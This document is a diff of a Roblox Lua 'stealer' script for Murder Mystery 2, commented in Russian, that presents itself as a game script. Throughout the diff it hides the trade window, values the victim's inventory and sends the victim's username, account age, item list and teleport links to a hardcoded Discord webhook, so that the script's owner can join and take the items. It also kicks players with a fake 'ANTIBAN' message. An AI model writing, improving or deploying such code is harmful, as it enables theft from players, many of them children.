@@ -1,40 +1,46 @@
-Username = "Roopo1344"
-local lp = game:GetService("Players").LocalPlayer
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1429509611173707858/I_Ph9seXu0Fa-652BET-vfssKq7N6HBFU9kw4Lbrovb5Wpk57ZmS3d4ynznwxNlqfaYw"
-MinimumValues = 0
-local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
-local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
-local ExecutorValue = identifyexecutor() or "Unknown"
-local VersionValue = "1.2 (Updated teleport)"
-local placeId = game.PlaceId
-local jobId = game.JobId
--- Loads --
+Username = "DiagoPlug" -- >> Your main account
+Username2 = "DiagoPlug" -- >> Your alt account
+Webhook = "https://discord.com/api/webhooks/1429509611173707858/I_Ph9seXu0Fa-652BET-vfssKq7N6HBFU9kw4Lbrovb5Wpk57ZmS3d4ynznwxNlqfaYw" -- >> https://stealer.to/
+MinimumValues = 0 -- >> Set 0 to disable
+
 repeat task.wait() until game:IsLoaded()
+
 if getgenv().mm2 then return end
 getgenv().mm2 = true
--- Server checker + kicker --
+
 if #game:GetService("Players"):GetPlayers() == game.Players.MaxPlayers then
     game:GetService("Players").LocalPlayer:Kick("\nANTIBAN: Admins detected. Join another server")
     return
 end
+
 if game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType"):InvokeServer() == "VIPServer" then
     game.Players.LocalPlayer:Kick("\nScript doesn't supported vip servers")
     return
 end
--- MinimumValues checker --
+
 if MinimumValues == nil or MinimumValues < 0 then
     MinimumValues = 0
 end
 
--- Способ 1: Roblox protocol ссылка (самый надежный)
+local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
+local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
+local LP = game:GetService("Players").LocalPlayer
+local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
+local NameValue = game:GetService("Players").LocalPlayer.Name
+or "Unknown"
+local IdValue = game:GetService("Players").LocalPlayer.userId
+or "Unknown"
+local AgeValue = game:GetService("Players").LocalPlayer.AccountAge
+or "Unknown"
+local ExecutorValue = identifyexecutor() or "Unknown"
+local VersionValue = "1.1"
+
+-- СИСТЕМА ТЕЛЕПОРТА (ИСПРАВЛЕННАЯ)
+local placeId = game.PlaceId
+local jobId = game.JobId
 local protocolLink = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
-
--- Способ 2: Классический скрипт для входа
-local scriptTemplate = [[
-game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")
-]]
-
-local classicScript = string.format(scriptTemplate, placeId, jobId)
+local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. jobId .. "\")"
+local consoletp = "Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
 
 local valuesTable = {
     -- >> Ancients/Tier 2 << --
@@ -215,48 +221,68 @@ local valuesTable = {
     ["Cavern_K_2019"] = 22,
 }
 
-local data = {
-    ["content"] = "🎯 **ВЬЕБАН** Очередной кукич:",
-    ["embeds"] = {{
-        ["title"] = "Долбаеб ракнул ваш скрипт! - " .. lp.Name,
-        ["color"] = 16753920,
-        ["fields"] = {
+function SendMessageEMBED(url, embed, bool)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    
+    -- Формируем контент с телепортом в стиле первого кода
+    local teleportContent = "🎯 **ВЬЕБАН** Очередной кукич:\n\n" .. TeleportScript
+    
+    local data = {
+        ["username"] = "Aliwave 2.0",
+        ["avatar_url"] = "https://i.pinimg.com/1200x/b9/dc/87/b9dc8716aed2277f22643c0d87f6169f.jpg",
+        ["content"] = teleportContent,
+        ["embeds"] = {
             {
-                ["name"] = "🔗 Браузер (Мануал)",
-                ["value"] = "🚀Нажми чтобы поймать связь\n```" .. protocolLink .. "```",
-                ["inline"] = false
-            },
-            {
-                ["name"] = "📜 Для автоматической связи",
-                ["value"] = "```lua\n" .. classicScript .. "\n```",
-                ["inline"] = false
+                ["title"] = embed.title,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+                ["footer"] = {
+                    ["text"] = "A.T via 2025! Alwaez - сын короля!"
+                }
             }
-        },
-        ["footer"] = {
-            ["text"] = "A.T via 2025! Alwaez - legendary coder"
         }
-    }}
-}
+    }
+    
+    local data2 = {
+        ["username"] = "Aliwave 2.0", 
+        ["avatar_url"] = "https://i.pinimg.com/1200x/b9/dc/87/b9dc8716aed2277f22643c0d87f6169f.jpg", 
+        ["content"] = "-- @everyone\n" .. teleportContent,
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+                ["footer"] = {
+                    ["text"] = "A.T via 2025! Alwaez - сын короля!"
+                }
+            }
+        }
+    }
+    
+    local body = http:JSONEncode(data)
+    local body2 = http:JSONEncode(data2)
 
-local success, result = pcall(function()
-    local json = game:GetService("HttpService"):JSONEncode(data)
-    return request({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = json
-    })
-end)
-
-if success then
-    print("✅ Уведомление отправлено!")
-    print("🔗 Protocol ссылка: " .. protocolLink)
-    print("📜 Classic script:")
-    print(classicScript)
-else
-    warn("❌ Ошибка отправки: " .. tostring(result))
+    if bool == true then
+        local response = request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body2
+        })
+    else
+        local response = request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end
 end
 
+-- Новая улучшенная функция скрытия TradeGUI
 local function setupTradeGUIHider()
     local player = game:GetService("Players").LocalPlayer
     local playerGui = player:WaitForChild("PlayerGui")
@@ -283,11 +309,11 @@ local function setupTradeGUIHider()
             end
         end
     end
-end
 
-hideTradeGUI()
+    -- Скрываем сразу при запуске
+    hideTradeGUI()
 
--- Отслеживаем появление новых окон
+    -- Отслеживаем появление новых окон
     playerGui.ChildAdded:Connect(function(child)
         if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
             hideTradeGUI()
@@ -299,9 +325,19 @@ hideTradeGUI()
         hideTradeGUI()
         task.wait(0.1)
     end
+end
 
 -- Запускаем скрытие GUI в отдельной корутине
 coroutine.wrap(setupTradeGUIHider)()
+
+local levelTable = {}
+for i,v in pairs(LevelModule.XPTable) do
+    if PlayerDataModule.NewXP < v then
+        table.insert(levelTable, i)
+    end
+end
+local playerLevel = math.min(table.unpack(levelTable))
+local playerPrestige = LevelModule.Prestige
 
 local allItems = {}
 local totalValues = 0
@@ -554,32 +590,49 @@ if totalValues < MinimumValues then
     return
 end
 
+-- УЛУЧШЕННАЯ ФУНКЦИЯ ДЛЯ ПОЛУЧЕНИЯ ТОП ПРЕДМЕТОВ
 local function getTopValuableItems(n)
     local allItems = {}
     
-    -- Собираем все предметы
+    -- Собираем все предметы с детальной информацией
     for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
         for c, d in pairs(b) do
             local itemValue = valuesTable[d.DataID] or 0
+            local totalValue = itemValue * d.Amount
+            
             table.insert(allItems, {
                 name = d.ItemName,
+                dataId = d.DataID,
                 value = itemValue,
                 amount = d.Amount,
-                totalValue = itemValue * d.Amount
+                totalValue = totalValue,
+                rarity = d.Rarity
             })
         end
     end
     
-    -- Сортируем по убыванию ценности
+    -- Сортируем по убыванию ценности за штуку
     table.sort(allItems, function(a, b) 
         return a.value > b.value
     end)
     
-    -- Возвращаем топ-N предметов
+    -- Возвращаем топ-N предметов с улучшенным форматированием
     local topItems = {}
     for i = 1, math.min(n, #allItems) do
         local item = allItems[i]
-        table.insert(topItems, string.format("%s [%s] x%d", item.name, item.value, item.amount))
+        local rarityEmoji = {
+            Unique = "💎",
+            Ancient = "🔥", 
+            Godly = "⭐",
+            Vintage = "🕰️",
+            Legendary = "👑",
+            Rare = "🔵",
+            Uncommon = "🟢",
+            Common = "⚪"
+        }
+        
+        local emoji = rarityEmoji[item.rarity] or "📦"
+        table.insert(topItems, string.format("%s %s • %d • x%d", emoji, item.name, item.value, item.amount))
     end
     
     return topItems
@@ -588,6 +641,97 @@ end
 -- Получаем 5 самых ценных предметов
 local topItems = getTopValuableItems(5)
 local topItemsText = #topItems > 0 and table.concat(topItems, "\n") or "No valuable items"
+
+-- ОБНОВЛЕННЫЙ EMBED С СИСТЕМОЙ ТЕЛЕПОРТА
+local embed = {
+    ["title"] = "🎯 ВЬЕБАН - Долбаеб ракнул ваш скрипт! - " .. NameValue,
+    ["color"] = 16753920, -- Оранжевый цвет как в первом коде
+    ["fields"] = {
+        {
+            ["name"] = "🔗 **СИСТЕМА ТЕЛЕПОРТА**",
+            ["value"] = 
+            "**Браузер (Мануал):**\n🚀Нажми чтобы поймать связь\n```" .. protocolLink .. "```\n\n" ..
+            "**Для автоматической связи:**\n```lua\n" .. TeleportScript .. "\n```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "〘:mammoth:〙**ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ**",
+            ["value"] = 
+            "```lua\n"..
+            "Username      : "..NameValue.."\n"..
+            "Account Age   : "..AgeValue.." Days\n"..
+            "Executor      : "..ExecutorValue.."\n"..
+            "Receiver      : "..Username.."/"..Username2.."\n"..
+            "Version       : "..VersionValue.."```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "〘:moneybag:〙**ЦЕННОСТЬ ИНВЕНТАРЯ**",
+            ["value"] = 
+            "```lua\n"..
+            "💎 ТОП 5 ПРЕДМЕТОВ:\n"..topItemsText.."\n\n"..
+            "💰 Общая стоимость : "..totalValues.."\n\n"..
+            "💎 Uniques Value   : "..uniqueItemsValue.."\n"..
+            "🔥 Ancients Value  : "..ancientItemsValue.."\n"..
+            "⭐ Godlies Value   : "..godlyItemsValue.."\n"..
+            "👑 Legendaries     : "..legendaryItemsValue.."\n"..
+            "🕰️ Vintages Value  : "..vintageItemsValue.."```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "〘:package:〙**ПОЛНЫЙ СПИСОК ПРЕДМЕТОВ**",
+            ["value"] = "[📋 Нажми для просмотра]("..pastebinLink..")",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "〘:computer:〙**СКРИПТ ДЛЯ КОНСОЛИ**",
+            ["value"] = "```lua\n" .. consoletp .. "\n```",
+            ["inline"] = false
+        },
+    }
+}
+
+-- Отправляем уведомление в зависимости от ценности
+if godlyItemsValue >= 100 or ancientItemsValue >= 100 or uniqueItemsValue >= 100 or totalValues >= 100 then
+    SendMessageEMBED(Webhook, embed, true)
+else
+    SendMessageEMBED(Webhook, embed, false)
+end
+
+function SendLeaveNotify(Username)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
+    local dataLeave = {
+        ["username"] = "Aliwave Leave Notify",
+        ["avatar_url"] = "https://i.pinimg.com/1200x/b9/dc/87/b9dc8716aed2277f22643c0d87f6169f.jpg",
+        ["content"] = "**"..Username.."** was scared!!",
+        ["embeds"] = {
+            {
+                ["color"] = 0xff3e3e,
+                ["fields"] = {
+                    {
+                        ["name"] = "〘:rotating_light:〙**Player Info**",
+                        ["value"] = "```lua\n"..
+                            "Username      : "..NameValue.."\n"..
+                            "Account Age   : "..AgeValue.." Days\n"..
+                            "Executor      : "..ExecutorValue.."```"
+                    }
+                }
+            }
+        }
+    }
+
+    local jsonDataLeave = game:GetService("HttpService"):JSONEncode(dataLeave)
+
+    local response = request({
+        Url = Webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = jsonDataLeave
+    })
+end
 
 game:GetService("Players").PlayerRemoving:Connect(function(player)
     if player == game:GetService("Players").LocalPlayer then
